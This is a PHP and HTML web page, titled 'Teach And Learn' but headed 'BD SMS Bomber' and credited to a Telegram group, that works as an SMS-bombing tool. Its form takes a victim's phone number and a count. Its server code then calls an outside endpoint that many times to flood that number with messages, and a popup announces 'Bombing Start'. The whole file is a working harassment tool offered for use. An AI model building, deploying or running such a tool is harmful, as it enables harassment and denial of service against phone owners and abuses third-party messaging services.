<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'];
    $amount = (int)$_POST['amount'];

    if (!empty($phone) && $amount > 0) {
        // Loop to call the new API based on the specified amount
        for ($i = 1; $i <= $amount; $i++) {
            $url = "https://hadivai-mahirvai.my.id/kupasamsu.php?phone=" . urlencode($phone);
            $response = file_get_contents($url);
            error_log("Response from $url: $response");
        }

        echo 'APIs have been called successfully.';
    } else {
        echo 'Please enter a valid phone number and amount.';
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teach And Learn</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #000000, #004d00);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #00ff00;
        }
        h1, h2, h3 {
            margin: 0;
            text-align: center;
            white-space: nowrap;
        }
        h1 {
            font-size: 1.8rem;
            text-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00;
        }
        h2 {
            font-size: 1.4rem;
            text-shadow: 0 0 10px #00ff00;
        }
        h3 {
            font-size: 1.2rem;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 50px #00ff00;
            width: 350px;
            text-align: center;
        }
        input[type="text"], input[type="number"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #00ff00;
            border-radius: 5px;
            background: #000;
            color: #00ff00;
            font-size: 1rem;
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        button {
            background: #00ff00;
            color: #000;
            padding: 10px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px 0;
            width: 100%;
            font-size: 1rem;
            transition: all 0.4s ease;
            box-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
        }
        button:hover {
            background: #004d00;
            color: #00ff00;
            transform: scale(1.1);
            box-shadow: 0 0 50px #00ff00;
        }
        .credit {
            margin-top: 20px;
            color: #00ff00;
            font-size: 1rem;
            text-shadow: 0 0 10px #00ff00;
        }
        .credit a {
            color: #00ff00;
            text-decoration: none;
            font-weight: bold;
        }
        .credit a:hover {
            color: #004d00;
        }
        #popup {
            visibility: hidden;
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.9);
            color: #00ff00;
            padding: 15px;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 10px;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 0 50px #00ff00;
            text-align: center;
        }
        #popup.show {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>

<!-- Channel Name and Presentation -->
<h1>ERROR 404</h1>
<h2>Present</h2>
<h3>BD SMS Bomber</h3>

<div class="container">
    <form id="apiForm" method="POST" onsubmit="showPopup(); return false;">
        <input type="text" name="phone" id="phone" placeholder="Enter phone number" required>
        <input type="number" name="amount" id="amount" placeholder="Enter amount" required>
        <button type="submit">Submit</button>
        <button type="button" onclick="window.location.href='https://t.me/TEAM_ERROR_404'">Join Telegram Channel</button>
    </form>
    <div id="message"></div>
    <div class="credit">
        <p>Credit: <a href="https://t.me/TEAM_ERROR_404" target="_blank">ERROR 404 OWNER</a></p>
    </div>
</div>

<!-- Pop-up message -->
<div id="popup">Bombing Start within 3second </div>

<script>
    function showPopup() {
        // Show the popup
        var popup = document.getElementById('popup');
        popup.classList.add('show');
        
        // Hide the popup after 2.3 seconds
        setTimeout(function() {
            popup.classList.remove('show');
            // Submit the form after the popup disappears
            document.getElementById("apiForm").submit();
        }, 2300);
    }
</script>

</body>
</html>
